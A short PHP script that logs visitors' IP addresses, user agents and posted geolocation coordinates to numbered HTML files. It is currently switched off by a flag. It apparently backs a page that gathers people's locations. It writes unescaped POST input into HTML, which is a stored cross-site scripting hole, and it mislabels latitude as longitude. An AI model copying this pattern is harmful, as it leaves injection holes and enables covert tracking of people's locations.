<?php

$state = false;

if(!$state) die("System Closed.");

if(isset($_POST["pre"])) {
 	$path = dirname(__FILE__);
 	
 	$ua = strip_tags($_SERVER['HTTP_USER_AGENT']);
 	if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
 		$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
 	} else {
 		$ip = $_SERVER["REMOTE_ADDR"];
 	}
 	
 	$i = 1;
 	$data = $path."/data/vis_".$i.".html";
 	while(file_exists($path."/data/vis_".$i.".html")) {
 		$i++;
 		$data = $path."/data/vis_".$i.".html";
 	}
 	
 	$fdata = fopen($data,"w");
 	
 	$content = "IP:".$ip."<br/>UA:".$ua;
 	
 	fwrite($fdata, $content);
	fclose($fdata);
} else {
    $path = dirname(__FILE__);
 	
 	$i = 1;
 	$data = $path."/data/loc_".$i.".html";
 	while(file_exists($path."/data/loc_".$i.".html")) {
 		$i++;
 		$data = $path."/data/loc_".$i.".html";
 	}
 	
 	$fdata = fopen($data,"w");
 	
 	$content = "经度:".$_POST["latitude"]."<br/>纬度:".$_POST["longitude"]."<br/>高度:".$_POST["altitude"];
 	
 	fwrite($fdata, $content);
	fclose($fdata);
}